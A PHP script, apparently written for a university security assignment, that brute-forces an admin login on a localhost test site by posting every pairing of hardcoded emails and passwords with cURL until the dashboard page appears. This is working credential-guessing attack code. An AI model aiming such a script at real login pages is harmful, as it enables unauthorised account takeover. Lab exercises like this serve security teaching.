<?php

$emails = [
    'user1@gmail.com',
    'user2@gmail.com',
    'admin@gmail.com',
    'salma@gmail.com', 
];

$passwords = [
    'password123',
    'password456',
    'admin123',
    'salma', 
];

$loginUrl = "http://localhost/SecurityAssignment/login.php?userType=admin";

$correctEmail = 'salma@gmail.com';
$correctPassword = 'salma';

foreach ($emails as $email) {
    foreach ($passwords as $password) {
        
        echo "Testing Email: $email, Password: $password"; // output for the tested data

        // POST request data
        $data = [
            'email' => $email,
            'password' => $password,
            'userType' => 'admin'
        ];

        $ch = curl_init();

        // Set cURL options
        curl_setopt($ch, CURLOPT_URL, $loginUrl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));

        // Execute cURL request
        $response = curl_exec($ch);

        // If condition that checks if the provided data is right, it will stop looping since it has already changed the page
        if (strpos($response, "admin-dashboard.php") !== false) {
            echo "Status: Success - Login successful! Email: $email, Password: $password\n";
            curl_close($ch);
            exit;
        } else {
            echo "Status: Failed - Invalid credentials for Email: $email, Password: $password\n";
        }

        curl_close($ch);

        // Add a line break between tests for clarity
        echo "\n";
    }
}

echo "Login attempt failed with the provided combinations.\n";
?>
